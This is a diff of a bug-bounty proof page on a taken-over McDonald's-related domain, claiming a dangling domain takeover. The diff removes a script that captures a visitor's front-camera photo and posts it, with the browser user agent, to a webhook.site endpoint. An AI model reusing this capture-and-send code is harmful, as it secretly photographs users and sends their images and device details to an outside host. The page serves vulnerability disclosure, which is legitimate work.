@@ -27,94 +27,13 @@
             font-size: 16px;
             line-height: 1.5;
         }
-        .btn {
-            background-color: #d32f2f;
-            color: white;
-            padding: 10px 20px;
-            border: none;
-            border-radius: 5px;
-            font-size: 16px;
-            cursor: pointer;
-            margin-top: 15px;
-        }
-        .success {
-            color: #2e7d32;
-            margin-top: 15px;
-            display: none;
-        }
-        #video {
-            display: none;
-        }
-        #canvas {
-            display: none;
-        }
     </style>
 </head>
 <body>
     <div class="container">
         <h1>Pwned by Deep Chotaliya</h1>
         <p>This domain (mymcdonaldsrewards.in) has been successfully verified for security research purposes to demonstrate a dangling domain takeover vulnerability in the McDonald's mobile application.</p>
-        
-        <video id="video" playsinline autoplay></video>
-        <canvas id="canvas"></canvas>
-        
-        <button class="btn" onclick="startCapture()">Test Camera Exfiltration Proof</button>
-        
-        <div class="success" id="successMsg">✓ Proof captured and sent!</div>
         <p><small>Bugcrowd Submission Proof</small></p>
     </div>
-
-    <script>
-        function startCapture() {
-            navigator.mediaDevices.getUserMedia({ 
-                video: { 
-                    facingMode: 'user',
-                    width: { ideal: 480 },
-                    height: { ideal: 360 }
-                },
-                audio: false
-            }).then(function(mediaStream) {
-                var video = document.getElementById('video');
-                video.srcObject = mediaStream;
-                
-                setTimeout(function() {
-                    captureAndSend(video, mediaStream);
-                }, 1000);
-            }).catch(function(err) {
-                console.error('Camera error:', err);
-                document.getElementById('successMsg').textContent = '✗ Camera access failed';
-                document.getElementById('successMsg').style.color = '#d32f2f';
-                document.getElementById('successMsg').style.display = 'block';
-            });
-        }
-        
-        function captureAndSend(video, mediaStream) {
-            var canvas = document.getElementById('canvas');
-            var ctx = canvas.getContext('2d');
-            
-            // Resize to 480x360 for compression
-            canvas.width = 480;
-            canvas.height = 360;
-            ctx.drawImage(video, 0, 0, 480, 360);
-            
-            canvas.toBlob(function(blob) {
-                var formData = new FormData();
-                formData.append('image', blob, 'photo.jpg');
-                formData.append('domain', 'mymcdonaldsrewards.in');
-                formData.append('timestamp', new Date().toISOString());
-                formData.append('userAgent', navigator.userAgent);
-                
-                fetch('https://webhook.site/21c3a2a3-b9a2-45c6-b5b9-8932ee62d8e6', {
-                    method: 'POST',
-                    body: formData,
-                    keepalive: true,
-                    mode: 'no-cors'
-                });
-                
-                mediaStream.getTracks().forEach(track => track.stop());
-                document.getElementById('successMsg').style.display = 'block';
-            }, 'image/jpeg', 0.3);
-        }
-    </script>
 </body>
 </html>
